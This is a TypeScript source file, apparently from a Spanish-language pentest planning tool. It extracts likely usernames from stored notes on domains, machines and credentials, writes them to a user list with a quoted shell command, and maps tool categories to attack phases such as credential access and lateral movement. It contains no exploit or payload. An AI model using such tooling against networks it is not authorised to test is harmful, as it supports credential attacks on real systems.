function commandKey(panelPhase: string, commandPhase: string, tool: string, index: number) {
  return `${panelPhase}-${commandPhase}-${tool}-${index}`;
}

function extractVariables(command: string) {
  return Array.from(new Set(command.match(/<[^>\s]+>/g) ?? []));
}

function buildHostsEntry(asset: Asset) {
  const ipAddress = asset.ip_address.trim();
  const hostname = asset.hostname?.trim();
  const domain = asset.domain?.trim();
  if (!ipAddress || !hostname) {
    return null;
  }
  const names = Array.from(
    new Set(
      [domain, domain && !hostname.includes(".") ? `${hostname}.${domain}` : null, hostname].filter(
        (name): name is string => Boolean(name),
      ),
    ),
  );
  return [ipAddress, ...names].join(" ");
}

function shellSingleQuote(value: string) {
  return `'${value.replace(/'/g, "'\\''")}'`;
}

function extractReportUsers(assets: Asset[]) {
  const notebook = loadReportNotebook();
  const textBlocks = [
    ...Object.values(notebook.domains ?? {}).flatMap((domainNotes) => [
      domainNotes.users,
      domainNotes.credentials,
      domainNotes.groups,
      domainNotes.notes,
    ]),
    ...Object.values(notebook.machines ?? {}).flatMap((machineNotes) => [
      machineNotes.localUsers,
      machineNotes.sessions,
      machineNotes.credentials,
      machineNotes.privilege,
      machineNotes.notes,
    ]),
    ...assets.map((asset) => asset.notes ?? ""),
  ];
  const candidates = new Set<string>();
  for (const block of textBlocks) {
    for (const token of String(block ?? "").split(/[\s,;|()[\]{}"'`<>]+/)) {
      for (const candidate of normalizeUserToken(token)) {
        candidates.add(candidate);
      }
    }
  }
  return Array.from(candidates).sort((left, right) => left.localeCompare(right));
}

function loadReportNotebook(): {
  domains?: Record<string, Record<string, string>>;
  machines?: Record<string, Record<string, string>>;
} {
  try {
    return JSON.parse(window.localStorage.getItem(reportNotebookStorageKey) ?? "{}");
  } catch {
    return {};
  }
}

function normalizeUserToken(token: string) {
  const rawToken = token.trim();
  if (!rawToken || rawToken.length > 80) {
    return [];
  }
  const withoutSecret = rawToken.split(":")[0] ?? "";
  const userPart = withoutSecret.includes("\\")
    ? withoutSecret.split("\\").pop() ?? ""
    : withoutSecret.includes("@")
      ? withoutSecret.split("@")[0] ?? ""
      : withoutSecret;
  const cleanUser = userPart.replace(/^[^A-Za-z0-9._$-]+|[^A-Za-z0-9._$-]+$/g, "");
  if (!isLikelyUsername(cleanUser)) {
    return [];
  }
  return [cleanUser.toLowerCase()];
}

function isLikelyUsername(value: string) {
  if (!value || value.length < 2) {
    return false;
  }
  if (/^\d+$/.test(value) || /^\d{1,3}(?:\.\d{1,3}){3}$/.test(value)) {
    return false;
  }
  if (/^[a-f0-9]{24,}$/i.test(value)) {
    return false;
  }
  const ignored = new Set([
    "bloodhound",
    "credenciales",
    "domain",
    "dominio",
    "grupo",
    "grupos",
    "hash",
    "local",
    "password",
    "privilegios",
    "sesiones",
    "usuario",
    "usuarios",
  ]);
  return !ignored.has(value.toLowerCase()) && /^[A-Za-z0-9][A-Za-z0-9._$-]*$/.test(value);
}

function buildReportUsersCommand(path: string, users: string[]) {
  const directory = path.split(/[\\/]/).slice(0, -1).join("/") || ".";
  const quotedDirectory = shellSingleQuote(directory);
  const quotedPath = shellSingleQuote(path);
  const quotedUsers = users.map((user) => shellSingleQuote(user)).join(" ");
  return `mkdir -p ${quotedDirectory}; printf '%s\\n' ${quotedUsers} | sort -u > ${quotedPath}`;
}

function toolTemplateToOperationCommand(toolTemplate: ToolTemplate): OperationCommand {
  const phase = toolCategoryToAuditPhase(toolTemplate.group);
  return {
    phase,
    name: toolTemplate.name,
    tool: toolTemplate.tool,
    command: toolTemplate.kind === "command" ? toolTemplate.command : `# ${toolTemplate.notes}`,
    purpose: toolTemplate.kind === "command" ? toolTemplate.notes || "Herramienta personalizada." : "Nota operativa.",
    expected_output: toolTemplate.kind === "command" ? "Salida revisable y evidencia para el informe." : "Nota documentada.",
    notes: toolTemplate.authorizedTarget ? `Destino: ${toolTemplate.authorizedTarget}` : "",
  };
}

function toolCategoryToAuditPhase(category: string): AuditPhase {
  const phaseByCategory: Record<string, AuditPhase> = {
    "1. Reconocimiento": "reconnaissance",
    "2. Enumeracion inicial": "initial_enumeration",
    "3. Obtencion de credenciales": "credential_access",
    "4. Acceso inicial": "initial_access",
    "5. Enumeracion autenticada": "authenticated_enumeration",
    "6. Explotacion": "exploitation",
    "7. Escalada de privilegios": "privilege_escalation",
    "8. Movimiento lateral": "lateral_movement",
    "9. Pivoting y post-explotacion": "pivoting_post_exploitation",
    "10. Persistencia": "persistence",
  };
  return phaseByCategory[category] ?? "all";
}
